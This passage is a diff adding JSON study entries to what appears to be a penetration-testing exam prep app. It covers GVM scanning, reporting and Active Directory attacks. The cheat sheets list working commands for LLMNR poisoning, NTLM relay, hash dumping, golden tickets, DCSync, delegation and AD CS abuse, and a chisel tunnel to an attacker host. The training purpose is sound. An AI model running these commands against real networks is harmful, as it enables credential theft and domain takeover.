+    "cheatsheet_md": "<h3>Install & Setup</h3><pre>sudo apt install gvm # Install Greenbone Vulnerability Manager\nsudo gvm-setup # Setup GVM\nsudo gvm-check-setup # Verify installation</pre><h3>Start Services</h3><pre>sudo gvm-start # Start GVM services\n# Browse to https://localhost:9392 # Access web interface</pre><h3>Scan Configuration</h3><ul><li><b>Full and Fast</b>: Quick comprehensive scan</li><li><b>Full and Deep</b>: Thorough but slow</li><li><b>Discovery</b>: Host/service discovery only</li></ul><h3>Creating Scans</h3><ol><li>Create Target (IP/range)</li><li>Create Task (target + scan config)</li><li>Run Task</li><li>View Report</li></ol>",
+    "pitfalls_md": "<ul><li>GVM setup can be finicky - follow exact steps</li><li>Scans can take hours on large networks</li><li>False positives are common</li></ul>",
+    "exam_tips_md": "<ul><li>Use alongside Nmap vuln scripts</li><li>Export reports for documentation</li><li>Manual verification is still required</li></ul>",
+    "order_index": 29
+  },
+  {
+    "title": "Documentation & Reporting",
+    "slug": "documentation-reporting",
+    "category": "Fundamentals",
+    "summary": "Professional penetration test documentation, note-taking, and report writing.",
+    "cheatsheet_md": "<h3>Note-Taking Tools</h3><ul><li><b>CherryTree</b>: Hierarchical notes</li><li><b>Obsidian</b>: Markdown-based</li><li><b>Notion</b>: Cloud-based</li><li><b>Joplin</b>: Open-source</li></ul><h3>Screenshot Tools</h3><pre>flameshot gui # Take interactive screenshot\nscrot -s screenshot.png # Take selection screenshot</pre><h3>Essential Documentation</h3><ul><li>Commands run and output</li><li>Credentials discovered</li><li>Vulnerabilities found</li><li>Attack path taken</li></ul><h3>Report Sections</h3><ol><li>Executive Summary</li><li>Scope & Methodology</li><li>Findings (Critical/High/Med/Low)</li><li>Remediation Recommendations</li><li>Appendices (screenshots, logs)</li></ol>",
+    "pitfalls_md": "<ul><li>Not taking screenshots as you go</li><li>Poor organization of notes</li><li>Missing timestamps on findings</li></ul>",
+    "exam_tips_md": "<ul><li>Document EVERYTHING during exam</li><li>Screenshot each flag/proof</li><li>Include full command output</li><li>Submit report on time</li></ul>",
+    "order_index": 30
+  },
+  {
+    "title": "Attacking Enterprise Networks",
+    "slug": "attacking-enterprise",
+    "category": "Fundamentals",
+    "summary": "Simulated real-world penetration test combining all skills - External to Internal to Domain Admin.",
+    "cheatsheet_md": "<h3>Attack Path Overview</h3><ol><li><b>External Recon</b>: Subdomain enum, OSINT</li><li><b>Initial Access</b>: Web exploit, phishing</li><li><b>Internal Pivot</b>: Tunnel to internal network</li><li><b>AD Compromise</b>: Kerberoast, credential reuse</li><li><b>Domain Admin</b>: DCSync, Golden Ticket</li></ol><h3>External to Internal</h3><pre># Gain foothold via web app\n# Set up pivot\nchisel client ATTACKER:8000 R:socks # Establish SOCKS tunnel\n# Scan internal\nproxychains nmap -sT 172.16.0.0/24 # Scan internal network via proxy</pre><h3>AD Takeover</h3><pre>GetUserSPNs.py domain/user -dc-ip DC_IP -request # Kerberoast\nimpacket-secretsdump domain/admin@DC_IP # Dump domain hashes</pre>",
+    "pitfalls_md": "<ul><li>Getting tunnel vision on one attack path</li><li>Not maintaining access/persistence</li><li>Rushing and missing enumeration</li></ul>",
+    "exam_tips_md": "<ul><li>This is the exam simulation - practice it!</li><li>Time management is critical</li><li>Have backup attack plans ready</li><li>Document everything for report</li></ul>",
+    "order_index": 31
+  },
+  {
+    "title": "LLMNR/NBT-NS Poisoning",
+    "slug": "llmnr-poisoning",
+    "category": "Active Directory",
+    "summary": "Capture hashes via Link-Local Multicast Name Resolution and NetBIOS Name Service poisoning.",
+    "cheatsheet_md": "<h3>Responder</h3><pre>sudo responder -I eth0 -rdwv # Start Responder on eth0</pre><h3>Captured Hashes</h3><pre># Location\n/usr/share/responder/logs/ # Log directory\n# Format: NTLMv2\nuser::DOMAIN:challenge:response:... # Hash format</pre><h3>Crack with Hashcat</h3><pre>hashcat -m 5600 hash.txt wordlist.txt # Crack NTLMv2 hashes</pre><h3>Relay Attack</h3><pre># If SMB signing disabled\nimpacket-ntlmrelayx -tf targets.txt -smb2support # Relay NTLM auth to targets\n# Targets without signing\ncrackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt # Find relay targets</pre>",
+    "pitfalls_md": "<ul><li>Responder can cause network issues</li><li>Only works on local subnet</li><li>NTLMv2 can be slow to crack</li></ul>",
+    "exam_tips_md": "<ul><li>Run Responder early, capture while enumerating</li><li>Check for SMB signing for relay</li><li>Use strong wordlist + rules</li></ul>",
+    "order_index": 32
+  },
+  {
+    "title": "Pass the Ticket & Pass the Certificate",
+    "slug": "ptt-pth",
+    "category": "Active Directory",
+    "summary": "Lateral movement using Kerberos tickets and certificates.",
+    "cheatsheet_md": "<h3>Pass the Hash</h3><pre># Windows\nmimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:HASH # PTH with Mimikatz\n# Linux\nimpacket-psexec -hashes :HASH user@target # PTH with PsExec\nevil-winrm -i target -u user -H HASH # PTH with Evil-WinRM</pre><h3>Pass the Ticket</h3><pre># Export ticket\nmimikatz: sekurlsa::tickets /export # Dump tickets from memory\n# Use ticket\nexport KRB5CCNAME=ticket.ccache # Set ticket env var\nimpacket-psexec -k -no-pass user@target # Auth using Kerberos ticket</pre><h3>Pass the Certificate</h3><pre># Request cert with Certify\nCertify.exe request /ca:CA-SERVER /template:User # Request certificate\n# Convert to PFX\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx # Convert PEM to PFX\n# Use with Rubeus\nRubeus.exe asktgt /user:admin /certificate:cert.pfx /ptt # Request TGT using cert and Pass-the-Ticket</pre>",
+    "pitfalls_md": "<ul><li>Tickets expire - check validity</li><li>Need correct SPN for service access</li><li>Clock skew can break Kerberos</li></ul>",
+    "exam_tips_md": "<ul><li>Use impacket with -k for ticket auth</li><li>Check for AD CS misconfigurations</li><li>Export tickets before session ends</li></ul>",
+    "order_index": 33
+  },
+  {
+    "title": "ACL Abuse",
+    "slug": "acl-abuse",
+    "category": "Active Directory",
+    "summary": "Exploiting misconfigured Active Directory Access Control Lists.",
+    "cheatsheet_md": "<h3>BloodHound ACL Edges</h3><ul><li><b>GenericAll</b>: Full control</li><li><b>GenericWrite</b>: Modify attributes</li><li><b>WriteOwner</b>: Change owner</li><li><b>WriteDacl</b>: Modify permissions</li><li><b>ForceChangePassword</b>: Reset password</li></ul><h3>Abuse GenericAll on User</h3><pre># Set SPN for Kerberoasting\nSet-DomainObject -Identity victim -Set @{serviceprincipalname='fake/YOURPC'} # Abuse GenericAll to set SPN\nGetUserSPNs.py domain/attacker -dc-ip DC # Kerberoast the modified account</pre><h3>Abuse WriteDacl</h3><pre># Grant yourself DCSync rights\nAdd-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync # Abuse WriteDacl to grant DCSync</pre><h3>Shadow Credentials</h3><pre>Whisker.exe add /target:victim # Add shadow credential\nRubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass # Auth with shadow cert</pre>",
+    "pitfalls_md": "<ul><li>Not running BloodHound collection</li><li>Missing indirect attack paths</li><li>Forgetting to clean up changes</li></ul>",
+    "exam_tips_md": "<ul><li>BloodHound is essential for ACL discovery</li><li>Check 'Shortest Path to Domain Admin'</li><li>Look for GenericAll on groups</li></ul>",
+    "order_index": 34
+  },
+  {
+    "title": "Domain Trust Attacks",
+    "slug": "domain-trusts",
+    "category": "Active Directory",
+    "summary": "Exploiting trust relationships between domains and forests.",
+    "cheatsheet_md": "<h3>Enumerate Trusts</h3><pre># PowerView\nGet-DomainTrust # Enumerate trusts\nGet-DomainTrustMapping # Map trust relationships\n# Netdom\nnetdom trust /domain:target.local # Enumerate trusts via native tool</pre><h3>Trust Types</h3><ul><li><b>Parent-Child</b>: Automatic, transitive</li><li><b>Forest</b>: Between forests</li><li><b>External</b>: Non-transitive</li></ul><h3>SID History Injection</h3><pre># Get trust key\nmimikatz: lsadump::trust /patch # Dump trust keys\n# Create Golden Ticket with SID History\nmimikatz: kerberos::golden /user:admin /domain:child.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /krbtgt:HASH /ptt # Forge inter-realm ticket with Enterprise Admin SID</pre><h3>ExtraSids Attack</h3><pre># Add Enterprise Admins SID\nticket with /sids:S-1-5-21-parent-519 # SID History injection payload</pre>",
+    "pitfalls_md": "<ul><li>Trust direction matters for attack path</li><li>SID filtering can block attacks</li><li>Need to compromise child domain first</li></ul>",
+    "exam_tips_md": "<ul><li>Map all trusts with BloodHound</li><li>Check for SID filtering status</li><li>Parent-child trusts are exploitable by default</li></ul>",
+    "order_index": 35
+  },
+  {
+    "title": "Constrained & Unconstrained Delegation",
+    "slug": "delegation-attacks",
+    "category": "Active Directory",
+    "summary": "Abusing Kerberos delegation for privilege escalation and lateral movement.",
+    "cheatsheet_md": "<h3>Find Delegation</h3><pre># Unconstrained\nGet-DomainComputer -Unconstrained # Find unconstrained delegation\n# Constrained\nGet-DomainUser -TrustedToAuth # Find constrained delegation (users)\nGet-DomainComputer -TrustedToAuth # Find constrained delegation (computers)</pre><h3>Unconstrained Delegation</h3><pre># Coerce auth (PrinterBug)\nSpoolSample.exe DC attacker-machine # Trigger auth from DC\n# Capture TGT with Rubeus\nRubeus.exe monitor /interval:1 # Monitor for TGTs\n# Use DC TGT\nRubeus.exe ptt /ticket:base64ticket # Pass-the-Ticket</pre><h3>Constrained Delegation</h3><pre># Request service ticket\ngetST.py -spn cifs/target -impersonate administrator domain/user:pass # Abuse constrained delegation\nexport KRB5CCNAME=admin.ccache # Set ticket\nimpacket-psexec -k -no-pass target # Auth with ticket</pre><h3>Resource-Based (RBCD)</h3><pre># Need GenericWrite on target\nimpacket-rbcd domain/user:pass -action write -delegate-to TARGET$ -delegate-from YOURPC$ # Configure RBCD\ngetST.py -spn cifs/target -impersonate admin domain/yourpc$:pass # Abuse RBCD to impersonate admin</pre>",
+    "pitfalls_md": "<ul><li>Need local admin on unconstrained host</li><li>Constrained delegation has service restrictions</li><li>RBCD requires write access to target</li></ul>",
+    "exam_tips_md": "<ul><li>Check BloodHound for delegation</li><li>PrinterBug/PetitPotam for unconstrained</li><li>RBCD is powerful with write access</li></ul>",
+    "order_index": 36
+  },
+  {
+    "title": "AD CS Attacks",
+    "slug": "adcs-attacks",
+    "category": "Active Directory",
+    "summary": "Exploiting Active Directory Certificate Services misconfigurations.",
+    "cheatsheet_md": "<h3>Enumerate AD CS</h3><pre>Certify.exe find /vulnerable # Find vulnerable templates (ESC1, ESC8, etc.)\ncertipy find -u user@domain -p pass -dc-ip DC # Enumerate AD CS with Certipy</pre><h3>ESC1 - Misconfigured Template</h3><pre>certipy req -u user@domain -p pass -ca CA-NAME -template VulnTemplate -upn admin@domain # Request cert as Admin (ESC1)\ncertipy auth -pfx admin.pfx # Authenticate with certificate</pre><h3>ESC4 - Template ACL</h3><pre>certipy template -u user@domain -p pass -template VulnTemplate -save-old # Modify template to be vulnerable (ESC4)</pre><h3>ESC8 - NTLM Relay to HTTP</h3><pre>certipy relay -target http://ca-server/certsrv/certfnsh.asp # Start NTLM relay to AD CS\nPetitPotam.py attacker-ip dc-ip # Coerce DC authentication to relay</pre>",
+    "pitfalls_md": "<ul><li>Many ESC paths - check all</li><li>Certificate validity periods vary</li><li>Need to understand template settings</li></ul>",
+    "exam_tips_md": "<ul><li>Always run Certify/certipy enumeration</li><li>ESC1 and ESC8 are most common</li><li>Certs can persist after password change</li></ul>",
+    "order_index": 37
+  }
+]
